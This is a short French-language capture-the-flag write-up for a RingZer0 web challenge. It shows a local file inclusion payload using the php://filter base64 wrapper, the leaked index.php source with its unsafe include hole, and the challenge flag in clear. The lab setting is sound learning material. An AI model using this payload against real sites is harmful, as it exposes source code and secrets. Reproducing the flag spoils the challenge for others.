J'ai testé ceci:
http://challenges.ringzer0ctf.com:10350/xyz

Ça m'a retourné que xyz.php n'était pas trouvé... 

En cherchant en ligne je suis tombé sur les attaques LFI (local file inclusion)

Puis apparemment si je met un chemin vers un fichier .php il va s'exécuter ... Sachant qu'il existe un fichier index.php,
je veux le voir, je ne veux pas l'exécuter. Or pour ce faire, il faut utiliser un wrapper php qui va convertir le contenu du fichier en base64, ainsi la requête ressemblera à ça:

http://challenges.ringzer0ctf.com:10350/php://filter/convert.base64-encode/resource=index

Ca me retourne ce code base64
PD9waHAgCiAgICAjRkxBRy0xZjllMmVmYTc0YmVlMjAxMGIxOGQ0ZWYwMWM5MDhlYiAoMS8zKQogICAgaWYoIWRlZmluZWQoJ0FMTE9XX0FDQ0VTUycpKSBkZWZpbmUoJ0FMTE9XX0FDQ0VTUycsIHRydWUpOwogICAgc2Vzc2lvbl9zdGFydCgpOwoKICAgIGlmKGlzc2V0KCRfR0VUWyJsb2dvdXQiXSkpewogICAgICAgIHNlc3Npb25fZGVzdHJveSgpOwogICAgICAgIGhlYWRlcigiTG9jYXRpb246IC8iKTsKICAgICAgICBkaWUoKTsKICAgIH0KCiAgICBpZighaXNzZXQoJF9TRVNTSU9OWyJpZCJdKSl7CiAgICAgICAgJF9TRVNTSU9OWyJpZCJdID0gMDsKICAgIH0KICAgIAogICAgcmVxdWlyZV9vbmNlICdjb25maWcucGhwJzsKCiAgICBpZigkX1NFUlZFUlsiUkVRVUVTVF9VUkkiXSA9PT0gIi8iKXsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvbG9naW4iKTsKICAgICAgICBkaWUoKTsKICAgIH0KCiAgICAkcGFnZSA9IGV4cGxvZGUoJz8nLCBzdWJzdHIoJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0sIDEpLCAyKVswXTsKICAgIGlmKCRwYWdlID09PSAiaW5kZXgiKXsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiAvbG9naW4iKTsKICAgICAgICBkaWUoKTsKICAgIH0KPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgPGhlYWQ+CiAgICAgICAgPHRpdGxlPlByaW5jZSBCdWJiYSdzIFNlY3VyaXR5IFBvcnRhbDwvdGl0bGU+CiAgICAgICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iaHR0cHM6Ly9jb2RlLmpxdWVyeS5jb20vanF1ZXJ5LTMuNS4xLmpzIj48L3NjcmlwdD4KICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJqcy9ib290c3RyYXAuYnVuZGxlLm1pbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iY3NzL2Jvb3RzdHJhcC5taW4uY3NzIj4KICAgICAgICA8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgogICAgICAgICAgICBib2R5IHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6ICMzMzM7CiAgICAgICAgICAgIH0KICAgICAgICA8L3N0eWxlPgogICAgPC9oZWFkPgogICAgPGJvZHk+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj48P3BocCBpbmNsdWRlKCRwYWdlLiIucGhwIik7ID8+PC9kaXY+CiAgICA8L2JvZHk+CjwvaHRtbD4=

ceci correspond au code php suivant lorsque décodé:
```php
<?php 
    #FLAG-1f9e2efa74bee2010b18d4ef01c908eb (1/3)
    if(!defined('ALLOW_ACCESS')) define('ALLOW_ACCESS', true);
    session_start();

    if(isset($_GET["logout"])){
        session_destroy();
        header("Location: /");
        die();
    }

    if(!isset($_SESSION["id"])){
        $_SESSION["id"] = 0;
    }
    
    require_once 'config.php';

    if($_SERVER["REQUEST_URI"] === "/"){
        header("Location: /login");
        die();
    }

    $page = explode('?', substr($_SERVER["REQUEST_URI"], 1), 2)[0];
    if($page === "index"){
        header("Location: /login");
        die();
    }
?>
...
```

Le flag est en commentaire dans le code 
FLAG-1f9e2efa74bee2010b18d4ef01c908eb